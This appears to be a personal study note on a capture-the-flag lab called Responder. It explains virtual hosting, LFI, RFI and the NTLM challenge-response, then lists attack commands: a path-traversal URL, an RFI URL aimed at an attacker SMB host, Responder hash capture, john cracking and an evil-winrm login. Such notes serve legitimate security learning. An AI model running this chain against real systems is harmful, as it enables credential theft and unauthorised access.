# Responder

## My Takeaways

- **Name-Based Virtual hosting:** When I first tried to connect to the target, Firefox throw me an error "DNS address could not be found". Looking into it, I found this concept called Name-Based Virtual Hosting. It allows a single server to host different domains. To reach a domain that is not registered in a public DNS, you need to add it manually in the file `/etc/hosts` file in your Linux machine.

- **LFI (Local File Inclusion):** This technique exploits improper input sanitization, allowing an attacker to read sensitive files on the server's filesystem by manipulating a URL parameter.

- **RFI (Remote File Inclusion):** Similar to LFI, but instead of reading local files, the attacker make the server load a remote file they control, through common procotols like HTTP,FTP, or SMB.

- **NTLM Authentication Challenge-Response Process:**
  1. The client sends its username and domain name to the server.
  2. The server responds with a random string called the Challenge.
  3. The client encrypts the Challenge using a hash using the user's password and sends it back.
  4. The server performs the same operation hash and compare it to the one was received by the client.
  5. if these two match, access is granted.

- **NTLM Capture Attack through SMB (Responder):** We set up a rogue SMB server using Responder, then we use the RFI vulnerability to make web server initiate an NTLM authentication request against our machine. This will act as the client and initialize the NTLM process. This gave us the NetNTLMv2 hash, which we then cracked offline using a brute-force tool to recover the plaintext password.

![Responder Diagram](../assets/imgs/Responder.svg)

## Useful Commands

```bash
  # LFI
  ### http://somepage.com/index.php?page=../../../../windows/system32/drivers/etc/hosts

  # RFI
  ### http://somepage.com/index.php?page=//10.10.10.10/somefile

  # initialize our SMB Server
  responder -I tun0

  # crack the hash
  john -w=/usr/share/wordlists/rockyou.txt hash.txt

  # connect with our new credentials
  evilwin-rm -i server_IP -u user -p password
```
